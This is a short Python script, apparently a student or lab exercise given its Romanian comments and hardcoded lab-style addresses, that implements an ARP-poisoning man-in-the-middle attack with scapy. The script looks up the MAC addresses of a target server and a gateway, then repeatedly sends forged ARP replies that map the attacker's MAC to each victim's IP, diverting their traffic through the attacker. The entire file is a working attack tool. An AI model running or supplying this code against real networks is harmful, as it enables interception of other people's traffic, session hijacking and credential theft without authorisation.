from scapy.all import *
import os
import signal
import sys
import threading
import time

def get_mac(ip):
    # trimite cu scapy arp catre ip, "who is ip? tell me"
    resp, unans = sr(ARP(op=1,hwdst="ff:ff:ff:ff:ff:ff",pdst=ip),retry=2,timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    my_mac = get_if_hwaddr(conf.iface)
    print(f"[Found] My MAC is {my_mac}")
    print("Poisoning... Ctrl+C to stop")
    try:
        while True:
            # schimba-l pe pdst,aflat la mac-ul hwdst => si spune-i ca lui psrc i se asociaza hwsrc
            # op 2 = is-has
            # spune lui gateway ca mac-ul meu apartine lui target ip
            print(f"[ARP] Ii spun lui {gateway_ip} ca {target_ip} se afla la {my_mac} (mac-ul lui middle)")
            send(ARP(op=2, pdst=gateway_ip,hwdst=gateway_mac, psrc=target_ip,hwsrc=my_mac))
            time.sleep(2)    
            print(f"[ARP] Ii spun lui {target_ip} ca {gateway_ip} se afla la {my_mac} (mac-ul lui middle)")
            # spune-i lui target ip ca mac-ul meu apartine lui gateway
            send(ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=gateway_ip,hwsrc=my_mac))
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopped ARP poison attack.")

def spoof(ip_target, ip_gateway):
    print("Getting macs...")
    mac_target = get_mac(ip_target)
    mac_gateway = get_mac(ip_gateway)
    if mac_target is None or mac_gateway is None:
        print("[Error!] Could not get both macs, aborting...")
        sys.exit(-1)

    print(f"[Found] Target mac : {mac_target}")    
    print(f"[Found] Gateway mac : {mac_gateway}")

    poison_thread = threading.Thread(target=arp_poison, args=(ip_gateway,mac_gateway,ip_target,mac_target))
    poison_thread.start()

if __name__=="__main__":
    print("[ Banana Spoofer ] Starting up...")
    ip_server = "198.10.0.2"
    ip_gateway = "198.10.0.1" 

    #pune te intre server si gateway si fa l sa creada ca eu s gateway

    spoof(ip_target=ip_server,ip_gateway=ip_gateway)